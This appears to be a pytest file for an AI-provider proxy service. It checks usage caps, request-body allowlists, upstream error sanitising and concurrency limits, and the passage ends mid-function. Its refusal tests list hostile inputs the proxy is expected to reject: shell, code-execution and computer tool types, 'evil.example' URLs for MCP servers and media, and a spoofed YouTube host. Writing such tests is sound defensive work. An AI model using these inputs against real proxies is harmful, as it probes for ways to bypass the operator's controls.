"""Offline proofs that the cloud findings stay closed: caps for every role (A01), body allowlists (A02), upstream
error mapping, concurrency (A23), the lesson cache review (A08) and the admin token (A22).

Upstream calls go either to a closed local port (as in test_caps.py) or to an httpx.MockTransport installed on
the app's client after startup, which records the forwarded body. Nothing reaches a real provider.

    cd cloud && python -m pytest tests -q
"""

from __future__ import annotations

import asyncio
import importlib
import json
import logging
import sqlite3
import sys
import tracemalloc
from collections import namedtuple

import httpx
import pytest

from test_caps import ADMIN, ADMIN_TOKEN, CLOUD, anthropic, gemini, install, make_cloud  # noqa: F401  (make_cloud is a fixture)

HAIKU = "claude-haiku-5-5"
SONNET = "claude-sonnet-5-5"
GEM = "gemini-3.8-flash"
YT = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
ANTHROPIC_OK = {"type": "message", "model": HAIKU, "content": [{"type": "text", "text": "hi"}],
                "usage": {"input_tokens": 1000, "output_tokens": 100}}
GEMINI_OK = {"candidates": [{"content": {"parts": [{"text": "{}"}]}}], "modelVersion": GEM,
             "usageMetadata": {"promptTokenCount": 2000, "candidatesTokenCount": 300}}


class Upstream:
    """A mock provider on the app's httpx client: records every forwarded request, answers `status` + `body`."""

    def __init__(self, app_mod, status: int = 200, body: dict | None = None, headers: dict | None = None) -> None:
        self.requests: list[httpx.Request] = []
        self.status, self.body, self.headers = status, body, headers or {}
        app_mod.http = httpx.AsyncClient(transport=httpx.MockTransport(self.handle))

    def handle(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        body = self.body if self.body is not None else (GEMINI_OK if "gemini" in str(request.url) or ":generate" in str(request.url) else ANTHROPIC_OK)
        return httpx.Response(self.status, json=body, headers=self.headers)

    @property
    def last(self) -> dict:
        return json.loads(self.requests[-1].content)


def post_anthropic(client, h, body: dict, **headers):
    return client.post("/v1/anthropic/v1/messages", headers={**h, **headers}, json=body)


def post_gemini(client, h, body: dict, model: str = GEM):
    return client.post(f"/v1/gemini/v1beta/models/{model}:generateContent", headers=h, json=body)


def msg(text="hi"):
    return [{"role": "user", "content": text}]


# --------------------------------------------------------------------------- A01: caps for every role

def test_roleless_anonymous_calls_hit_the_daily_request_cap(make_cloud):
    client, app_mod = make_cloud(FREE_DAILY_REQUESTS="3")
    h, _ = install(client)
    assert [anthropic(client, h, role=None).status_code for _ in range(3)] == [502] * 3
    for r in (anthropic(client, h, role=None), gemini(client, h, role=None), anthropic(client, h, role="lesson"),
              anthropic(client, h, role="finder"), anthropic(client, h, role="workspace")):
        assert r.status_code == 429
        err = r.json()["error"]
        assert err["type"] == "miyagi_quota" and err["limit"] == "daily_requests" and err["cap"] == 3
        assert err["scope"] == "install" and r.headers["x-should-retry"] == "false"


def test_free_defaults_cover_a_normal_lesson(make_cloud):
    client, app_mod = make_cloud(unset=("FREE_DAILY_REQUESTS", "FREE_DAILY_USD", "LINKED_DAILY_REQUESTS",
                                        "LINKED_DAILY_USD", "DAILY_USD_CAP"))
    # dollars are the caps; request counts and the global brake are off unless set (R01, D13)
    assert app_mod.FREE_DAILY_REQUESTS == 0 and app_mod.FREE_DAILY_USD == 2.0
    assert app_mod.LINKED_DAILY_REQUESTS == 0 and app_mod.LINKED_DAILY_USD == 3.0
    assert app_mod.DAILY_USD_CAP == 0 and not hasattr(app_mod, "FREE_COACH_CALLS_PER_DAY")


def test_per_install_usd_cap(make_cloud):
    client, app_mod = make_cloud(FREE_DAILY_USD="0.05")
    h, _ = install(client)
    th = app_mod.hash_token(h["Authorization"][7:])
    app_mod.store.add_tokens(th, "anthropic", HAIKU, 10, 10, 0.05)
    r = anthropic(client, h, role=None)
    assert r.status_code == 429
    err = r.json()["error"]
    assert err["type"] == "miyagi_quota" and err["limit"] == "daily_spend" and err["cap"] == 0.05 and err["scope"] == "install"
    other, _ = install(client)
    assert anthropic(client, other, role=None).status_code == 502  # per install


def test_linked_caps_count_every_install_of_the_user(make_cloud):
    client, app_mod = make_cloud(LINKED_DAILY_REQUESTS="3", FREE_DAILY_REQUESTS="100")
    a, _ = install(client)
    b, _ = install(client)
    loner, _ = install(client)
    for h in (a, b):
        app_mod.store.link_user(app_mod.hash_token(h["Authorization"][7:]), "user-1")
    assert [anthropic(client, h, role=None).status_code for h in (a, b, a)] == [502] * 3
    r = anthropic(client, b, role=None)
    assert r.status_code == 429 and r.json()["error"]["limit"] == "daily_requests" and r.json()["error"]["scope"] == "account"
    assert anthropic(client, loner, role=None).status_code == 502  # unlinked: its own anonymous cap


def test_pro_skips_per_install_caps_but_not_the_kill_switch(make_cloud):
    client, app_mod = make_cloud(FREE_DAILY_REQUESTS="1", FREE_DAILY_USD="0.01", DAILY_USD_CAP="5")
    h, token_id = install(client)
    assert client.post(f"/admin/tokens/{token_id}/plan", json={"plan": "pro"}, headers=ADMIN).status_code == 200
    assert [anthropic(client, h, role=None).status_code for _ in range(3)] == [502] * 3
    app_mod.store.add_tokens(app_mod.hash_token(h["Authorization"][7:]), "anthropic", HAIKU, 1, 1, 5.0)
    assert anthropic(client, h).json()["error"]["limit"] == "daily_usd"


def test_reservations_stop_parallel_calls_overshooting(make_cloud):
    _, app_mod = make_cloud()
    s, th = app_mod.store, "f" * 64
    reserve = 4096 * app_mod.output_price(SONNET)  # max_tokens x output price: about $0.04
    results = [s.admit_call(th, "anthropic", SONNET, None, 0, usd_cap=0.1, reserve_usd=reserve) for _ in range(3)]
    assert [r[0] for r in results] == [None, None, "usd"]  # the third would pass $0.10 with the two in flight
    day = app_mod.today()
    s.settle(th, "anthropic", SONNET, day, reserve, SONNET, 1000, 100, 0.003)  # the first call cost $0.003
    assert s.admit_call(th, "anthropic", SONNET, None, 0, usd_cap=0.1, reserve_usd=reserve)[0] is None
    # the global kill switch counts reservations too
    assert s.admit_call("e" * 64, "anthropic", SONNET, None, 0, global_usd_cap=0.1, reserve_usd=reserve)[0] == "global_usd"


def test_reservation_is_settled_to_the_real_cost(make_cloud):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    th = app_mod.hash_token(h["Authorization"][7:])
    r = post_anthropic(client, h, {"model": HAIKU, "max_tokens": 4000, "messages": msg()})
    assert r.status_code == 200 and len(up.requests) == 1
    assert app_mod.store.usd_today_for(th) == pytest.approx(app_mod.estimate_usd(HAIKU, 1000, 100))
    up.status, up.body = 500, {"type": "error", "error": {"type": "api_error", "message": "x"}}
    post_anthropic(client, h, {"model": HAIKU, "max_tokens": 4000, "messages": msg()})
    assert app_mod.store.usd_today_for(th) == pytest.approx(app_mod.estimate_usd(HAIKU, 1000, 100))  # failed: no cost


# --------------------------------------------------------------------------- A02: Anthropic body allowlist

def test_anthropic_forwards_only_allowlisted_keys(make_cloud):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    schema = {"type": "object", "properties": {"a": {"type": "string"}}, "required": ["a"], "additionalProperties": False}
    body = {"model": SONNET, "max_tokens": 99999, "messages": [{"role": "user", "content": [
                {"type": "text", "text": "look", "cache_control": {"type": "ephemeral"}},
                {"type": "image", "source": {"type": "base64", "media_type": "image/jpeg", "data": "AAAA"}}], "extra": 1}],
            "system": [{"type": "text", "text": "sys", "cache_control": {"type": "ephemeral"}}],
            "temperature": 0.2, "stop_sequences": ["END"], "stream": False,
            "thinking": {"type": "adaptive", "display": "omitted"},
            "output_config": {"effort": "low", "format": {"type": "json_schema", "schema": schema}, "task_budget": {"total": 1}},
            "tools": [{"name": "pick", "description": "d", "input_schema": schema, "eager_input_streaming": True}],
            "tool_choice": {"type": "auto"}, "fallbacks": "default",
            "metadata": {"user_id": "x"}, "inference_geo": "us", "betas": ["x"], "anything_else": {"deep": True}}
    r = post_anthropic(client, h, body, **{"anthropic-beta": "server-side-fallback-2026-07-01", "x-miyagi-role": "coach"})
    assert r.status_code == 200, r.text
    sent = up.last
    assert sent == {
        "model": SONNET, "max_tokens": app_mod.MAX_TOKENS_CAP,
        "messages": [{"role": "user", "content": body["messages"][0]["content"]}],
        "system": body["system"], "temperature": 0.2, "stop_sequences": ["END"], "stream": False,
        "thinking": {"type": "adaptive", "display": "omitted"},
        "output_config": {"effort": "low", "format": {"type": "json_schema", "schema": schema}},
        "tools": [{"name": "pick", "description": "d", "input_schema": schema}],
        "tool_choice": {"type": "auto"}, "fallbacks": "default",
    }
    hdrs = up.requests[-1].headers
    assert hdrs["anthropic-beta"] == "server-side-fallback-2026-07-01" and hdrs["x-api-key"] == "fake-upstream-key"
    assert "x-miyagi-role" not in hdrs and "authorization" not in hdrs


@pytest.mark.parametrize("patch, needle", [
    ({"tools": [{"type": "web_search_20260209", "name": "web_search", "max_uses": 5}]}, "Tool type"),
    ({"tools": [{"type": "web_fetch_20260209", "name": "web_fetch"}]}, "Tool type"),
    ({"tools": [{"type": "code_execution_20260521", "name": "code_execution"}]}, "Tool type"),
    ({"tools": [{"type": "bash_20250124", "name": "bash"}]}, "Tool type"),
    ({"tools": [{"type": "computer_toolset_20260801", "name": "computer"}]}, "Tool type"),
    ({"tools": [{"type": "text_editor_20250728", "name": "str_replace_based_edit_tool"}]}, "Tool type"),
    ({"tools": [{"type": "memory_20250818", "name": "memory"}]}, "Tool type"),
    ({"tools": [{"type": "mcp_toolset", "mcp_server_name": "x"}]}, "Tool type"),
    ({"mcp_servers": [{"type": "url", "url": "https://evil.example/mcp", "name": "x"}]}, "mcp_servers"),
    ({"container": {"skills": []}}, "container"),
    ({"service_tier": "priority"}, "service_tier"),
    ({"context_management": {"edits": []}}, "context_management"),
    ({"messages": [{"role": "user", "content": [{"type": "image", "source": {"type": "url", "url": "https://evil.example/a.png"}}]}]}, "url sources"),
    ({"messages": [{"role": "user", "content": [{"type": "document", "source": {"type": "file", "file_id": "file_1"}}]}]}, "file sources"),
    ({"messages": [{"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t", "content": [
        {"type": "document", "source": {"type": "url", "url": "https://evil.example/a.pdf"}}]}]}]}, "url sources"),
    ({"system": [{"type": "document", "source": {"type": "url", "url": "https://evil.example/a.pdf"}}]}, "url sources"),
    ({"model": "claude-opus-5-5"}, "Model not allowed"),
    ({"fallbacks": [{"model": "claude-opus-5-5"}]}, "Opus"),
    ({"fallbacks": [{"model": "claude-sonnet-4-6"}]}, "fallbacks"),
    ({"tools": [{"type": "advisor_20260301", "name": "advisor", "model": "claude-opus-5-5"}]}, "Opus"),
    ({"fallback_model": "claude-opus-5"}, "Opus"),
    ({"fallback_model": "claude-sonnet-4-6"}, "allowed model"),
    ({"speed": "fast"}, "fast"),
    ({"thinking": {"type": "enabled", "budget_tokens": 50}}, "budget_tokens"),  # max_tokens is 10 here
    ({"thinking": {"type": "enabled", "budget_tokens": 40_000}, "max_tokens": 99999}, "budget_tokens"),  # over the cap
])
def test_anthropic_refuses_dangerous_fields(make_cloud, patch, needle):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    th = app_mod.hash_token(h["Authorization"][7:])
    r = post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg(), **patch})
    assert r.status_code == 400, r.text
    assert r.json()["error"]["type"] == "invalid_request_error" and needle in r.json()["error"]["message"]
    assert up.requests == [] and app_mod.store.requests_today(th) == 0  # never forwarded, never counted
    assert app_mod.inflight.total == 0


def test_anthropic_refuses_unknown_betas(make_cloud):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    for beta in ("mcp-client-2025-11-20", "server-side-fallback-2026-07-01,code-execution-2025-08-25", "files-api-2025-04-14"):
        r = post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg()}, **{"anthropic-beta": beta})
        assert r.status_code == 400 and "anthropic-beta" in r.json()["error"]["message"]
    assert up.requests == []


def test_web_tools_only_when_allowlisted_and_counted(make_cloud):
    client, app_mod = make_cloud(ANTHROPIC_SERVER_TOOLS="web_search", SERVER_TOOL_MAX_USES="3", FREE_DAILY_USD="5")
    up = Upstream(app_mod, body={**ANTHROPIC_OK, "usage": {"input_tokens": 10, "output_tokens": 10,
                                                           "server_tool_use": {"web_search_requests": 2}}})
    h, _ = install(client)
    tool = {"type": "web_search_20250305", "name": "web_search", "max_uses": 50, "allowed_domains": ["youtube.com"]}
    r = post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg(), "tools": [tool]})
    assert r.status_code == 200
    assert up.last["tools"] == [{"type": "web_search_20250305", "name": "web_search", "max_uses": 3, "allowed_domains": ["youtube.com"]}]
    th = app_mod.hash_token(h["Authorization"][7:])
    assert app_mod.store.usd_today_for(th) == pytest.approx(app_mod.estimate_usd(HAIKU, 10, 10) + 2 * 0.01)
    fetch = {"type": "web_fetch_20260209", "name": "web_fetch"}
    assert post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg(), "tools": [fetch]}).status_code == 400


def test_server_tool_usage_counted_defensively(make_cloud):
    _, app_mod = make_cloud()
    u = app_mod.Usage()
    u.feed(b'{"usage": {"input_tokens": 0, "output_tokens": 0, "server_tool_use": {"web_search_requests": 3, '
           b'"web_fetch_requests": 1, "code_execution_requests": 1}}}')

    class R:
        state = type("S", (), {})()
    assert u.totals(R(), "anthropic", HAIKU)[3] == pytest.approx(0.05)


# --------------------------------------------------------------------------- A02: Gemini body allowlist

def gem_body(**over):
    body = {"contents": [{"role": "user", "parts": [{"fileData": {"fileUri": YT}, "videoMetadata": {"fps": 0.5}},
                                                    {"text": "watch"}]}],
            "systemInstruction": {"parts": [{"text": "sys"}]},
            "generationConfig": {"responseMimeType": "application/json", "responseJsonSchema": {"type": "object"},
                                 "temperature": 0.2, "mediaResolution": "MEDIA_RESOLUTION_LOW"}}
    body.update(over)
    return body


def test_gemini_clamps_and_forwards_only_allowlisted_keys(make_cloud):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    body = gem_body(labels={"a": "b"}, generationConfig={
        **gem_body()["generationConfig"], "maxOutputTokens": 65536, "candidateCount": 4, "responseModalities": ["AUDIO"],
        "thinkingConfig": {"thinkingBudget": 24576, "includeThoughts": False}})
    r = post_gemini(client, h, body)
    assert r.status_code == 200, r.text
    sent = up.last
    assert set(sent) == {"contents", "systemInstruction", "generationConfig"}
    gc = sent["generationConfig"]
    assert gc["maxOutputTokens"] == 32768 and gc["thinkingConfig"] == {"thinkingBudget": 2048, "includeThoughts": False}
    assert gc["candidateCount"] == 1 and "responseModalities" not in gc
    assert sent["contents"][0]["parts"][0] == {"fileData": {"fileUri": YT}, "videoMetadata": {"fps": 0.5}}
    # no maxOutputTokens at all: the clamp is sent, so the cost is bounded
    post_gemini(client, h, gem_body())
    assert up.last["generationConfig"]["maxOutputTokens"] == 32768
    assert app_mod.GEMINI_MAX_OUTPUT_TOKENS == 32768 and app_mod.GEMINI_MAX_THINKING_TOKENS == 2048
    assert app_mod.MAX_GEMINI_BODY == 2 * 1024 * 1024


def test_engine_shaped_gemini_request_leaves_room_for_thinking_and_the_answer(make_cloud):
    """The engine (lesson/gemini.py _generate_json, finder/gemini.py) sends responseJsonSchema and neither
    maxOutputTokens nor a thinkingConfig, so dynamic thinking stays on. Thinking counts against maxOutputTokens on
    Gemini 2.5 and later: the clamp must leave the JSON answer room after Flash's 24576-token thinking ceiling."""
    client, app_mod = make_cloud(unset=("GEMINI_MAX_OUTPUT_TOKENS", "GEMINI_MAX_THINKING_TOKENS"))
    up = Upstream(app_mod)
    h, _ = install(client)
    body = gem_body()
    assert "maxOutputTokens" not in body["generationConfig"] and "thinkingConfig" not in body["generationConfig"]
    assert post_gemini(client, h, body).status_code == 200
    gc = up.last["generationConfig"]
    assert "thinkingConfig" not in gc  # nothing inserted: the model keeps its own thinking behaviour
    assert gc["maxOutputTokens"] - 24_576 >= 8192
    assert gc["responseJsonSchema"] == {"type": "object"} and gc["responseMimeType"] == "application/json"


@pytest.mark.parametrize("uri", [YT, "https://youtu.be/dQw4w9WgXcQ", "https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=42s"])
def test_gemini_youtube_file_uri_allowed(make_cloud, uri):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    body = gem_body(contents=[{"role": "user", "parts": [{"fileData": {"fileUri": uri, "mimeType": "video/*"}}]}])
    assert post_gemini(client, h, body).status_code == 200
    assert up.last["contents"][0]["parts"][0]["fileData"] == {"fileUri": YT, "mimeType": "video/*"}


@pytest.mark.parametrize("patch, needle", [
    ({"tools": [{"googleSearch": {}}]}, "functionDeclarations"),
    ({"tools": [{"codeExecution": {}}]}, "functionDeclarations"),
    ({"tools": [{"urlContext": {}}]}, "functionDeclarations"),
    ({"tools": [{"functionDeclarations": [], "googleSearchRetrieval": {}}]}, "functionDeclarations"),
    ({"cachedContent": "cachedContents/abc"}, "cachedContent"),
    ({"contents": [{"parts": [{"fileData": {"fileUri": "https://evil.example/video.mp4"}}]}]}, "YouTube"),
    ({"contents": [{"parts": [{"fileData": {"fileUri": "gs://bucket/secret.mp4"}}]}]}, "YouTube"),
    ({"contents": [{"parts": [{"fileData": {"fileUri": "https://generativelanguage.googleapis.com/v1beta/files/abc"}}]}]}, "YouTube"),
    ({"contents": [{"parts": [{"fileData": {"fileUri": "https://www.youtube.com.evil.example/watch?v=dQw4w9WgXcQ"}}]}]}, "YouTube"),
    ({"contents": [{"parts": [{"fileData": {"fileUri": "http://www.youtube.com/watch?v=dQw4w9WgXcQ"}}]}]}, "YouTube"),
    ({"systemInstruction": {"parts": [{"fileData": {"fileUri": "https://evil.example/x"}}]}}, "YouTube"),
])
def test_gemini_refuses_dangerous_fields(make_cloud, patch, needle):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    r = post_gemini(client, h, gem_body(**patch))
    assert r.status_code == 400 and needle in r.json()["error"]["message"], r.text
    assert up.requests == [] and app_mod.inflight.total == 0


def test_gemini_snake_case_cached_content_refused(make_cloud):
    client, app_mod = make_cloud()
    Upstream(app_mod)
    h, _ = install(client)
    assert post_gemini(client, h, gem_body(cached_content="cachedContents/x")).status_code == 400


# --------------------------------------------------------------------------- upstream errors

SECRET_UPSTREAM_TEXT = "org-7f3a internal: workspace wrk_42 limit 4000000 tokens/min, contact sales"


@pytest.mark.parametrize("status, body, want_status, want_type", [
    (429, {"type": "error", "error": {"type": "rate_limit_error", "message": SECRET_UPSTREAM_TEXT}}, 429, "rate_limit_error"),
    (529, {"type": "error", "error": {"type": "overloaded_error", "message": SECRET_UPSTREAM_TEXT}}, 529, "overloaded_error"),
    (402, {"type": "error", "error": {"type": "billing_error", "message": SECRET_UPSTREAM_TEXT}}, 503, "upstream_unavailable"),
    (400, {"type": "error", "error": {"type": "invalid_request_error",
                                      "message": "Your credit balance is too low. " + SECRET_UPSTREAM_TEXT}}, 503, "upstream_unavailable"),
    (401, {"type": "error", "error": {"type": "authentication_error", "message": SECRET_UPSTREAM_TEXT}}, 502, "upstream_auth_error"),
    (403, {"type": "error", "error": {"type": "permission_error", "message": SECRET_UPSTREAM_TEXT}}, 502, "upstream_auth_error"),
])
def test_anthropic_upstream_errors_are_generic(make_cloud, caplog, status, body, want_status, want_type):
    client, app_mod = make_cloud()
    Upstream(app_mod, status=status, body=body, headers={"retry-after": "7", "anthropic-organization-id": "org-7f3a"})
    h, _ = install(client)
    with caplog.at_level(logging.WARNING, logger="miyagi.cloud"):
        r = post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg()})
    assert r.status_code == want_status and r.json()["error"]["type"] == want_type
    assert "org-7f3a" not in r.text and "wrk_42" not in r.text and "org-7f3a" not in str(r.headers)
    assert "wrk_42" in caplog.text  # the operators still see what the provider said
    if status == 429:
        assert r.headers["retry-after"] == "7"
        assert "code" not in r.json()["error"]  # the provider's shape: the engine retries it, never "today's limit"


@pytest.mark.parametrize("status, want_status", [(429, 429), (503, 503), (500, 500)])
def test_gemini_upstream_errors_are_generic(make_cloud, status, want_status):
    client, app_mod = make_cloud()
    Upstream(app_mod, status=status, body={"error": {"code": status, "message": SECRET_UPSTREAM_TEXT, "status": "X"}})
    h, _ = install(client)
    r = post_gemini(client, h, gem_body())
    assert r.status_code == want_status and "wrk_42" not in r.text
    assert r.json()["error"]["code"] == want_status and "message" in r.json()["error"]


def test_plain_request_errors_still_pass_through(make_cloud):
    client, app_mod = make_cloud()
    Upstream(app_mod, status=400, body={"type": "error", "error": {"type": "invalid_request_error", "message": "messages: empty"}})
    h, _ = install(client)
    r = post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg()})
    assert r.status_code == 400 and r.json()["error"]["message"] == "messages: empty"


# --------------------------------------------------------------------------- A23: calls in flight

class HeldStream(httpx.AsyncByteStream):
    """An SSE body that sends one event, then waits for `gate` before the final usage."""

    def __init__(self, gate: asyncio.Event) -> None:
        self.gate = gate

    async def __aiter__(self):
        yield b'event: message_start\ndata: {"type":"message_start","message":{"model":"claude-haiku-5-5"}}\n\n'
        await self.gate.wait()
        yield b'event: message_delta\ndata: {"type":"message_delta","usage":{"input_tokens":100,"output_tokens":20}}\n\n'


async def _asgi(app, path: str, headers: dict, body: dict, disconnect: asyncio.Event):
    """One raw ASGI request; the client disconnects when `disconnect` is set. Returns (status, body bytes)."""
    raw = json.dumps(body).encode()
    sent: list[dict] = []
    first = [True]

    async def receive():
        if first[0]:
            first[0] = False
            return {"type": "http.request", "body": raw, "more_body": False}
        await disconnect.wait()
        return {"type": "http.disconnect"}

    async def send(m):
        sent.append(m)

    hs = [(k.lower().encode(), v.encode()) for k, v in {**headers, "content-type": "application/json",
                                                         "content-length": str(len(raw))}.items()]
    scope = {"type": "http", "asgi": {"version": "3.0"}, "http_version": "1.1", "method": "POST", "scheme": "http",
             "path": path, "raw_path": path.encode(), "query_string": b"", "root_path": "", "headers": hs,
             "client": ("127.0.0.1", 40000), "server": ("testserver", 80)}
    await app(scope, receive, send)
    status = next((m["status"] for m in sent if m["type"] == "http.response.start"), None)
    return status, b"".join(m.get("body", b"") for m in sent if m["type"] == "http.response.body")


def test_eleventh_concurrent_call_is_429_and_slots_come_back(make_cloud):
    client, app_mod = make_cloud(FREE_DAILY_USD="5")
    a, _ = install(client)
    b, _ = install(client)
    tha = app_mod.hash_token(a["Authorization"][7:])
    n = app_mod.PER_TOKEN_INFLIGHT
    assert n == 10 and app_mod.GLOBAL_INFLIGHT == 80  # the engine runs ~10 at once (README, Calls in flight)

    async def scenario():
        gate = asyncio.Event()
        calls = []

        async def handler(request):
            calls.append(request)
            if not json.loads(request.content).get("stream"):
                return httpx.Response(200, json=ANTHROPIC_OK)
            return httpx.Response(200, stream=HeldStream(gate), headers={"content-type": "text/event-stream"})

        app_mod.http = httpx.AsyncClient(transport=httpx.MockTransport(handler))
        stream_body = {"model": HAIKU, "max_tokens": 1000, "messages": msg(), "stream": True}
        path = "/v1/anthropic/v1/messages"
        hangups = [asyncio.Event() for _ in range(n)]
        tasks = [asyncio.create_task(_asgi(app_mod.app, path, a, stream_body, hangups[i])) for i in range(n)]
        for _ in range(200):
            if len(calls) == n:
                break
            await asyncio.sleep(0.01)
        assert len(calls) == n and app_mod.inflight.per[tha] == n and app_mod.inflight.total == n
        # the 11th concurrent call from the same install is refused before its body is read
        status, raw = await _asgi(app_mod.app, path, a, {"model": HAIKU, "max_tokens": 10, "messages": msg()}, asyncio.Event())
        err = json.loads(raw)["error"]
        assert status == 429 and err["limit"] == "inflight_token" and err["type"] == "concurrency_limit_error"
        assert len(calls) == n
        # another install is not blocked by it
        status, _ = await _asgi(app_mod.app, path, b, {**stream_body, "stream": False}, asyncio.Event())
        assert status == 200
        # two clients hang up mid-stream, the other streams finish normally
        hangups[0].set()
        hangups[1].set()
        await asyncio.sleep(0.05)
        gate.set()
        results = await asyncio.wait_for(asyncio.gather(*tasks), 5)
        assert [s for s, _ in results] == [200] * n
        assert all(b"message_delta" in raw for _, raw in results[2:])
        await app_mod.http.aclose()

    asyncio.run(scenario())
    assert app_mod.inflight.total == 0 and app_mod.inflight.per == {} and app_mod.inflight.bytes_total == 0
    # every reservation was settled: the finished streams at their real cost, and the two that hung up before the
    # final usage keep their whole reservation (the provider bills the prefill whether or not we saw the usage)
    clean, uses, tokens = app_mod.sanitize_anthropic({"model": HAIKU, "max_tokens": 1000, "messages": msg(), "stream": True})
    reserve = app_mod.anthropic_reserve(clean, len(json.dumps(clean).encode()), uses, tokens)
    assert app_mod.store.usd_today_for(tha) == pytest.approx((n - 2) * app_mod.estimate_usd(HAIKU, 100, 20) + 2 * reserve)
    assert app_mod.store.requests_today(tha) == n


def test_global_inflight_limit(make_cloud):
    client, app_mod = make_cloud(GLOBAL_INFLIGHT="1")
    h, _ = install(client)
    tok = app_mod.hash_token(h["Authorization"][7:])
    assert app_mod.inflight.acquire("someone-else") is None
    r = anthropic(client, h)
    assert r.status_code == 429 and r.json()["error"]["limit"] == "inflight_global" and r.headers["retry-after"] == "1"
    assert app_mod.store.requests_today(tok) == 0  # refused before admission: not counted
    app_mod.inflight.release("someone-else")
    assert anthropic(client, h).status_code == 502
    assert app_mod.inflight.total == 0 and tok not in app_mod.inflight.per


async def _asgi_slow(app, path: str, headers: dict, started: asyncio.Event, release: asyncio.Event, length: int = 100_000):
    """A request whose body never finishes arriving until `release` (the slow-body probe). Returns the status."""
    sent: list[dict] = []
    calls = [0]

    async def receive():
        calls[0] += 1
        if calls[0] == 1:
            started.set()
            return {"type": "http.request", "body": b'{"model": "claude-haiku-5-5", ', "more_body": True}
        await release.wait()
        return {"type": "http.disconnect"}

    async def send(m):
        sent.append(m)

    hs = [(k.lower().encode(), v.encode()) for k, v in {**headers, "content-type": "application/json",
                                                         "content-length": str(length)}.items()]
    scope = {"type": "http", "asgi": {"version": "3.0"}, "http_version": "1.1", "method": "POST", "scheme": "http",
             "path": path, "raw_path": path.encode(), "query_string": b"", "root_path": "", "headers": hs,
             "client": ("127.0.0.1", 40001), "server": ("testserver", 80)}
    try:
        await app(scope, receive, send)
    except Exception:  # a disconnect mid-body may end in an exception: the status below is what matters
        pass
    return next((m["status"] for m in sent if m["type"] == "http.response.start"), None)


def test_slow_bodies_cannot_take_the_global_slots(make_cloud):
    """The probe: GLOBAL_INFLIGHT=3 and three slow-body POSTs held open. Before the fix a normal call from another
    install got 429 inflight_global; the global slot is now taken only once a body has arrived."""
    client, app_mod = make_cloud(GLOBAL_INFLIGHT="3")
    Upstream(app_mod)
    slow = [install(client)[0] for _ in range(3)]
    normal, _ = install(client)

    async def scenario():
        release = asyncio.Event()
        starts = [asyncio.Event() for _ in slow]
        path = "/v1/anthropic/v1/messages"
        tasks = [asyncio.create_task(_asgi_slow(app_mod.app, path, h, starts[i], release)) for i, h in enumerate(slow)]
        await asyncio.wait_for(asyncio.gather(*(s.wait() for s in starts)), 5)
        assert app_mod.inflight.total == 0 and len(app_mod.inflight.per) == 3  # per-token slots only
        status, raw = await _asgi(app_mod.app, path, normal, {"model": HAIKU, "max_tokens": 10, "messages": msg()}, asyncio.Event())
        assert status == 200, raw
        release.set()
        await asyncio.wait_for(asyncio.gather(*tasks), 5)

    asyncio.run(scenario())
    assert app_mod.inflight.total == 0 and app_mod.inflight.per == {}


def test_body_read_timeout_is_408_and_frees_the_slot(make_cloud):
    client, app_mod = make_cloud(BODY_READ_TIMEOUT_S="0.2", FREE_DAILY_REQUESTS="5")
    up = Upstream(app_mod)
    h, _ = install(client)
    th = app_mod.hash_token(h["Authorization"][7:])
    assert app_mod.BODY_READ_TIMEOUT_S == 0.2

    async def scenario():
        started, release = asyncio.Event(), asyncio.Event()
        for path in ("/v1/anthropic/v1/messages", "/v1/gemini/gemini-3.8-flash:generateContent"):
            status = await asyncio.wait_for(_asgi_slow(app_mod.app, path, h, started, release), 5)
            assert status == 408
            assert app_mod.inflight.total == 0 and app_mod.inflight.per == {}
        status = await asyncio.wait_for(_asgi_slow(app_mod.app, "/v1/events", h, started, release, length=1000), 5)
        assert status == 408
        release.set()

    asyncio.run(scenario())
    assert up.requests == [] and app_mod.store.requests_today(th) == 0  # never forwarded, never counted
    _, app_mod = make_cloud(unset=("BODY_READ_TIMEOUT_S",))
    assert app_mod.BODY_READ_TIMEOUT_S == 20


class BrokenBody(httpx.AsyncByteStream):
    """A response body that fails mid-read with something that is not an httpx error (as a cancellation would)."""

    async def __aiter__(self):
        yield b'{"type": "message", '
        raise RuntimeError("cancelled mid-read")


def test_non_stream_read_failure_releases_the_slot_and_holds_the_cost(make_cloud):
    """A CancelledError (or any non-httpx exception) during the non-stream read used to skip call.finish(): the
    in-flight slot stayed taken until a restart. The read was cut short after a 200, so the provider billed it:
    the reservation is kept, not dropped."""
    client, app_mod = make_cloud()
    app_mod.http = httpx.AsyncClient(transport=httpx.MockTransport(lambda r: httpx.Response(200, stream=BrokenBody())))
    h, _ = install(client)
    th = app_mod.hash_token(h["Authorization"][7:])
    body = {"model": HAIKU, "max_tokens": 10, "messages": msg()}
    with pytest.raises(RuntimeError):
        post_anthropic(client, h, body)
    assert app_mod.inflight.total == 0 and th not in app_mod.inflight.per and app_mod.inflight.bytes_total == 0
    clean, uses, tokens = app_mod.sanitize_anthropic(body)
    reserve = app_mod.anthropic_reserve(clean, len(json.dumps(clean).encode()), uses, tokens)
    assert app_mod.store.usd_today_for(th) == pytest.approx(reserve) and reserve > 0


def test_over_cap_call_is_refused_before_its_body_is_read(make_cloud):
    client, app_mod = make_cloud(FREE_DAILY_REQUESTS="1")
    h, _ = install(client)
    assert anthropic(client, h).status_code == 502
    r = client.post("/v1/anthropic/v1/messages", headers=h, content=b"not even json")
    assert r.status_code == 429 and r.json()["error"]["limit"] == "daily_requests"


# --------------------------------------------------------------------------- reservations count input (fix 5, 12)

def test_reservation_counts_input_tokens(make_cloud):
    _, app_mod = make_cloud()
